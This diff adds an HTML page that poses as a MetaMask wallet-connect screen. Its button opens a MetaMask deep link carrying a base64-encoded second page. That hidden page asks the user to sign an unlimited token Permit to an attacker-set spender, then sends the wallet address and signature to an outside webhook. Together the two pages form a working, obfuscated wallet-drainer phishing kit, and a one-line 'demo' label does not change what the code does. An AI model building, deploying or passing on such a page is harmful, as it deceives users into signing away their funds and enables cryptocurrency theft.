@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connect to MetaMask</title>
+  <style>
+    body {
+      margin: 0; padding: 0; height: 100vh; background: #0f172a; color: #e2e8f0;
+      font-family: system-ui; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;
+    }
+    .logo { font-size: 80px; margin-bottom: 20px; }
+    h1 { font-size: 28px; margin-bottom: 20px; }
+    p { font-size: 18px; color: #94a3b8; margin-bottom: 40px; max-width: 500px; }
+    .btn {
+      padding: 16px 40px; font-size: 20px; background: #f6851b; color: white; border: none; border-radius: 16px;
+      cursor: pointer; box-shadow: 0 8px 30px rgba(246,133,27,0.5); transition: 0.3s;
+    }
+    .btn:hover { background: #e2761b; transform: scale(1.05); }
+    .fallback { margin-top: 30px; font-size: 14px; color: #64748b; }
+  </style>
+</head>
+<body>
+
+  <div class="logo">🦊</div>
+  <h1>Connect Your Wallet</h1>
+  <p>Click the button below to open MetaMask and connect securely</p>
+
+  <button class="btn" id="connectBtn">Open MetaMask</button>
+
+  <p class="fallback">If nothing happens, <a href="metamask://">open MetaMask manually</a></p>
+
+  <script>
+    // BASE64 ENCODED HTML KAMU (dari deeplink sebelumnya)
+    const base64HTML = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogIDx0aXRsZT5NZXRhTWFzayBEQXBwPC90aXRsZT4NCiAgPHN0eWxlPg0KICAgIGJvZHkgeyBtYXJnaW46MDsgcGFkZGluZzoyMHB4OyBiYWNrZ3JvdW5kOiMwZjE3MmE7IGNvbG9yOiNlMmU4ZjA7IGZvbnQtZmFtaWx5OnN5c3RlbS11aTsgdGV4dC1hbGlnbjpjZW50ZXI7IH0NCiAgICAubG9nbyB7IGZvbnQtc2l6ZTo4MHB4OyBtYXJnaW4tYm90dG9tOjIwcHg7IH0NCiAgICBoMSB7IGZvbnQtc2l6ZToyNHB4OyBtYXJnaW4tYm90dG9tOjIwcHg7IH0NCiAgICBwIHsgZm9udC1zaXplOjE2cHg7IGNvbG9yOiM5NGEzYjg7IG1hcmdpbi1ib3R0b206MzBweDsgfQ0KICAgIGJ1dHRvbiB7IHBhZGRpbmc6MTZweCAzMnB4OyBmb250LXNpemU6MThweDsgYmFja2dyb3VuZDojZjY4NTFiOyBjb2xvcjp3aGl0ZTsgYm9yZGVyOm5vbmU7IGJvcmRlci1yYWRpdXM6MTJweDsgY3Vyc29yOnBvaW50ZXI7IGJveC1zaGFkb3c6MCA4cHggMzBweCByZ2JhKDI0NiwxMzMsMjcsMC40KTsgfQ0KICAgIGJ1dHRvbjpob3ZlciB7IGJhY2tncm91bmQ6I2UyNzYxYjsgfQ0KICAgIC53YXJuaW5nIHsgYmFja2dyb3VuZDojN2YxZDFkOyBjb2xvcjojZmVjYWNhOyBwYWRkaW5nOjE2cHg7IGJvcmRlci1yYWRpdXM6MTJweDsgbWFyZ2luOjIwcHg7IGZvbnQtc2l6ZToxNHB4OyB9DQogIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCg0KICA8ZGl2IGNsYXNzPSJsb2dvIj7wn6aKPC9kaXY+DQogIDxoMT5Db25uZWN0IHRvIE1ldGFNYXNrPC9oMT4NCiAgPHA+Q2xpY2sgYmVsb3cgdG8gY29ubmVjdCB5b3VyIHdhbGxldCBhbmQgYXBwcm92ZSB0aGUgdHJhbnNhY3Rpb248L3A+DQogIDxidXR0b24gb25jbGljaz0iY29ubmVjdEFuZFNpZ24oKSI+Q29ubmVjdCBXYWxsZXQ8L2J1dHRvbj4NCg0KICA8ZGl2IGNsYXNzPSJ3YXJuaW5nIj4NCiAgICA8c3Ryb25nPldhcm5pbmc6PC9zdHJvbmc+IFRoaXMgaXMgYSBkZW1vLiBJbiByZWFsIGF0dGFjaywgYXBwcm92aW5nIHdpbGwgZHJhaW4geW91ciB3YWxsZXQuDQogIDwvZGl2Pg0KDQogIDxzY3JpcHQ+DQogICAgYXN5bmMgZnVuY3Rpb24gY29ubmVjdEFuZFNpZ24oKSB7DQogICAgICBpZiAodHlwZW9mIHdpbmRvdy5ldGhlcmV1bSAhPT0gJ3VuZGVmaW5lZCcpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAvLyAxLiBDb25uZWN0IHdhbGxldA0KICAgICAgICAgIGNvbnN0IGFjY291bnRzID0gYXdhaXQgd2luZG93LmV0aGVyZXVtLnJlcXVlc3QoeyBtZXRob2Q6ICdldGhfcmVxdWVzdEFjY291bnRzJyB9KTsNCiAgICAgICAgICBjb25zdCB1c2VyQWRkcmVzcyA9IGFjY291bnRzWzBdOw0KICAgICAgICAgIGFsZXJ0KCJXYWxsZXQgY29ubmVjdGVkOiAiICsgdXNlckFkZHJlc3Muc2xpY2UoMCw2KSArICIuLi4iICsgdXNlckFkZHJlc3Muc2xpY2UoLTQpKTsNCg0KICAgICAgICAgIC8vIDIuIFJlcXVlc3Qgc2lnbmF0dXJlICh0eXBlZCBkYXRhKQ0KICAgICAgICAgIGNvbnN0IHR5cGVkRGF0YSA9IHsNCiAgICAgICAgICAgIHR5cGVzOiB7DQogICAgICAgICAgICAgIEVJUDcxMkRvbWFpbjogWw0KICAgICAgICAgICAgICAgIHsgbmFtZTogIm5hbWUiLCB0eXBlOiAic3RyaW5nIiB9LA0KICAgICAgICAgICAgICAgIHsgbmFtZTogInZlcnNpb24iLCB0eXBlOiAic3RyaW5nIiB9LA0KICAgICAgICAgICAgICAgIHsgbmFtZTogImNoYWluSWQiLCB0eXBlOiAidWludDI1NiIgfSwNCiAgICAgICAgICAgICAgICB7IG5hbWU6ICJ2ZXJpZnlpbmdDb250cmFjdCIsIHR5cGU6ICJhZGRyZXNzIiB9DQogICAgICAgICAgICAgIF0sDQogICAgICAgICAgICAgIFBlcm1pdDogWw0KICAgICAgICAgICAgICAgIHsgbmFtZTogIm93bmVyIiwgdHlwZTogImFkZHJlc3MiIH0sDQogICAgICAgICAgICAgICAgeyBuYW1lOiAic3BlbmRlciIsIHR5cGU6ICJhZGRyZXNzIiB9LA0KICAgICAgICAgICAgICAgIHsgbmFtZTogInZhbHVlIiwgdHlwZTogInVpbnQyNTYiIH0sDQogICAgICAgICAgICAgICAgeyBuYW1lOiAibm9uY2UiLCB0eXBlOiAidWludDI1NiIgfSwNCiAgICAgICAgICAgICAgICB7IG5hbWU6ICJkZWFkbGluZSIsIHR5cGU6ICJ1aW50MjU2IiB9DQogICAgICAgICAgICAgIF0NCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICBkb21haW46IHsNCiAgICAgICAgICAgICAgbmFtZTogIlVuaXN3YXAgVjIiLA0KICAgICAgICAgICAgICB2ZXJzaW9uOiAiMSIsDQogICAgICAgICAgICAgIGNoYWluSWQ6IDEsDQogICAgICAgICAgICAgIHZlcmlmeWluZ0NvbnRyYWN0OiAiMHgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgIHByaW1hcnlUeXBlOiAiUGVybWl0IiwNCiAgICAgICAgICAgIG1lc3NhZ2U6IHsNCiAgICAgICAgICAgICAgb3duZXI6IHVzZXJBZGRyZXNzLA0KICAgICAgICAgICAgICBzcGVuZGVyOiAiMHhEZWFkQmVlZkRlYWRCZWVmRGVhZEJlZWZEZWFkQmVlZkRlYWRCZWVmIiwNCiAgICAgICAgICAgICAgdmFsdWU6ICIxMTU3OTIwODkyMzczMTYxOTU0MjM1NzA5ODUwMDg2ODc5MDc4NTMyNjk5ODQ2NjU2NDA1NjQwMzk0NTc1ODQwMDc5MTMxMjk2Mzk5MzUiLA0KICAgICAgICAgICAgICBub25jZTogIjAiLA0KICAgICAgICAgICAgICBkZWFkbGluZTogIjk5OTk5OTk5OTkiDQogICAgICAgICAgICB9DQogICAgICAgICAgfTsNCg0KICAgICAgICAgIGNvbnN0IHNpZ25hdHVyZSA9IGF3YWl0IHdpbmRvdy5ldGhlcmV1bS5yZXF1ZXN0KHsNCiAgICAgICAgICAgIG1ldGhvZDogImV0aF9zaWduVHlwZWREYXRhX3Y0IiwNCiAgICAgICAgICAgIHBhcmFtczogW3VzZXJBZGRyZXNzLCBKU09OLnN0cmluZ2lmeSh0eXBlZERhdGEpXQ0KICAgICAgICAgIH0pOw0KDQogICAgICAgICAgYWxlcnQoIlNpZ25hdHVyZSBhcHByb3ZlZCFcXG5Zb3VyIHdhbGxldCBpcyBub3cgY29tcHJvbWlzZWQuIik7DQoNCiAgICAgICAgICAvLyBFeGZpbCBrZSB3ZWJob29rIGthbXUNCiAgICAgICAgICBmZXRjaCgiaHR0cHM6Ly9wb2xpdGUtd2hhbGUtNzMud2ViaG9vay5jb29sIiwgew0KICAgICAgICAgICAgbWV0aG9kOiAiUE9TVCIsDQogICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IGFkZHJlc3M6IHVzZXJBZGRyZXNzLCBzaWduYXR1cmU6IHNpZ25hdHVyZSB9KQ0KICAgICAgICAgIH0pOw0KDQogICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgIGFsZXJ0KCJPcGVyYXRpb24gcmVqZWN0ZWQ6ICIgKyBlcnIubWVzc2FnZSk7DQogICAgICAgIH0NCiAgICAgIH0gZWxzZSB7DQogICAgICAgIGFsZXJ0KCJNZXRhTWFzayBub3QgZGV0ZWN0ZWQuIEluc3RhbGwgTWV0YU1hc2sgdG8gY29udGludWUuIik7DQogICAgICB9DQogICAgfQ0KICA8L3NjcmlwdD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==";
+
+    // FULL DEEP LINK
+    const metamaskDeepLink = `metamask://browse?url=data:text/html;base64,${base64HTML}`;
+
+    document.getElementById("connectBtn").addEventListener("click", function() {
+      // 1. Coba buka MetaMask deep link
+      window.location.href = metamaskDeepLink;
+
+      // 2. Fallback: kalau tidak terbuka, arahkan ke MetaMask app store atau manual open
+      setTimeout(() => {
+        if (confirm("MetaMask not opened? Click OK to download or open manually.")) {
+          window.location.href = "https://metamask.io/download/";
+        }
+      }, 2000);
+    });
+  </script>
+
+</body>
+</html>
